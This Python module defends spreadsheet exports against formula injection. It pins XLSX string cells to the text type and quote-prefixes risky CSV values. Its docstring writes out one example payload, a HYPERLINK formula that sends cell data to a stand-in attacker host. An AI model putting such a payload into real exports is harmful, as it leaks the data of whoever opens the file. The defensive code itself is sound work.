"""Formula-injection defenses for generated spreadsheet exports (CSV + XLSX).

Tenant-supplied text (part descriptions, notes, customer names, visitor
purposes, report column names) lands in exported spreadsheets verbatim.
Spreadsheet applications evaluate a cell whose text begins with ``=``, ``+``,
``-``, ``@``, TAB (0x09) or CR (0x0D) as a **formula** when they open the file,
so a stored value such as ``=HYPERLINK("http://evil.test/?d="&A1,"CLICK")``
becomes a live, clickable exfiltration primitive for whoever opens the export.
openpyxl makes the XLSX case worse than a rendering quirk: it writes a
leading-``=`` Python string into a real ``<f>`` formula element. This is
CWE-1236 (improper neutralization of formula elements in a CSV file).

The two formats get **different** fixes, because only one of them has types:

**XLSX -- non-destructive.** XLSX distinguishes a formula cell from a string
cell in the markup, so we simply pin the cell to a string cell
(``data_type = "s"``) after assignment. The text is then written byte-for-byte
as the operator typed it, inside ``<is><t>...</t></is>`` with no ``<f>``
element, and Excel shows it as literal text. Nothing is mutated, nothing is
prefixed, and real numbers/dates are untouched because only ``str`` values are
pinned.

**CSV -- lossy, unavoidably.** CSV carries no type information; the only signal
a reader has is the text itself, so the sole neutralization available is to
prefix the value with a single quote (``'``), which spreadsheet apps consume as
"the rest of this cell is text". That means the *exported artifact* differs
from the stored value for affected cells -- an honest, deliberate trade, and it
is why the XLSX path does not do this. Stored data is never modified. Collateral
is minimized: the prefix is added only when the value both starts with a
formula-initiating character *and* is not a plain finite number (anchored, no
surrounding whitespace or ``_`` separators — the same rule as the frontend's
``PLAIN_NUMBER_RE``), so ``-5.00``, ``-0.005`` and ``+1e3`` stay usable as
numbers in the spreadsheet.
Sanitization runs before ``csv.writer`` sees the value, so RFC 4180 quoting of
commas/quotes/newlines is unaffected.

These helpers assume an export of *stored data*. Do not use them on a sheet
that is deliberately meant to contain formulas.
"""

import re
from typing import Any, Dict, Iterable, List, Mapping

# OWASP CSV-injection set: the characters that make a spreadsheet treat cell
# text as an expression. TAB and CR are included because Excel skips them and
# then parses what follows.
FORMULA_INITIATING_CHARS = frozenset({"=", "+", "-", "@", "\t", "\r"})

# Prefix that forces a spreadsheet to read the remainder of a CSV cell as text.
CSV_TEXT_PREFIX = "'"


def is_formula_initiating(value: Any) -> bool:
    """True when ``value`` is a string a spreadsheet would parse as a formula."""
    # ``value[:1]`` rather than ``value[0]`` so the empty string is handled.
    return isinstance(value, str) and value[:1] in FORMULA_INITIATING_CHARS


# Mirrors PLAIN_NUMBER_RE in ``frontend/src/utils/csv.ts`` — the two must stay
# in lockstep. Anchored and whitespace-free on purpose: ``float()`` would be
# wrong here because it trims whitespace and accepts ``_`` digit separators, so
# it reports ``"\t5"`` and ``"-1_000"`` as numbers — and a TAB-prefixed value is
# exactly the payload class this module exists to neutralize.
_PLAIN_NUMBER_RE = re.compile(r"^[+-]?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$", re.IGNORECASE)


def _is_plain_number(text: str) -> bool:
    """True when ``text`` is just a finite number (``-5.00``, ``+1e3``, ``-0.005``).

    Such values are only "formula-initiating" by accident of their sign, and
    prefixing them would strand the recipient with text where they expect a
    number. ``nan``/``inf`` and shapes only ``float()`` accepts (surrounding
    whitespace, ``_`` separators) don't match: they take the normal
    neutralization path.
    """
    return _PLAIN_NUMBER_RE.match(text) is not None


def sanitize_csv_value(value: Any) -> Any:
    """Neutralize one CSV cell. Non-strings and safe strings pass through unchanged.

    LOSSY BY NECESSITY: an affected cell gains a leading ``'`` in the exported
    file. CSV has no type system, so there is no non-destructive equivalent of
    the XLSX ``data_type`` fix. Stored data is unaffected.
    """
    if not is_formula_initiating(value):
        return value
    if _is_plain_number(value):
        return value
    return CSV_TEXT_PREFIX + value


def sanitize_csv_row(values: Iterable[Any]) -> List[Any]:
    """Neutralize every cell of a CSV row (header rows included)."""
    return [sanitize_csv_value(value) for value in values]


def sanitize_csv_mapping(row: Mapping[str, Any]) -> Dict[str, Any]:
    """Neutralize the values of a ``csv.DictWriter`` row, preserving its keys.

    Keys are left alone because ``DictWriter`` matches them against
    ``fieldnames``; sanitize the header separately with :func:`sanitize_csv_row`.
    """
    return {key: sanitize_csv_value(value) for key, value in row.items()}


def force_text_cell(cell: Any) -> Any:
    """Pin an already-assigned openpyxl cell to a string cell. Returns the cell.

    openpyxl infers ``data_type`` at assignment time: a string longer than one
    character starting with ``=`` becomes ``"f"`` (a real ``<f>`` formula
    element) and a string matching an Excel error literal (``#REF!`` ...) becomes
    ``"e"``. Neither is ever intended when exporting stored text, so any cell
    holding a ``str`` is pinned to ``"s"``.

    Non-destructive: the value is not rewritten, only its declared type. Numbers,
    dates, booleans and ``None`` are left alone so numerics stay numeric.
    """
    if isinstance(cell.value, str) and cell.data_type != "s":
        cell.data_type = "s"
    return cell


def write_cell(worksheet: Any, row: int, column: int, value: Any) -> Any:
    """``worksheet.cell(...)`` that can never emit a formula. Returns the cell."""
    return force_text_cell(worksheet.cell(row=row, column=column, value=value))


def append_row(worksheet: Any, values: Iterable[Any]) -> None:
    """``worksheet.append(...)`` that can never emit a formula."""
    worksheet.append(list(values))
    for cell in worksheet[worksheet.max_row]:
        force_text_cell(cell)


def harden_worksheet(worksheet: Any) -> None:
    """Pin every string cell already written to ``worksheet`` (see :func:`force_text_cell`)."""
    for row in worksheet.iter_rows():
        for cell in row:
            force_text_cell(cell)


def harden_workbook(workbook: Any) -> None:
    """Pin every string cell in every sheet. Call immediately before ``workbook.save``.

    Use this on workbooks built with ``ws.append`` so a future row added to the
    builder is covered without having to remember this file exists.
    """
    for worksheet in workbook.worksheets:
        harden_worksheet(worksheet)
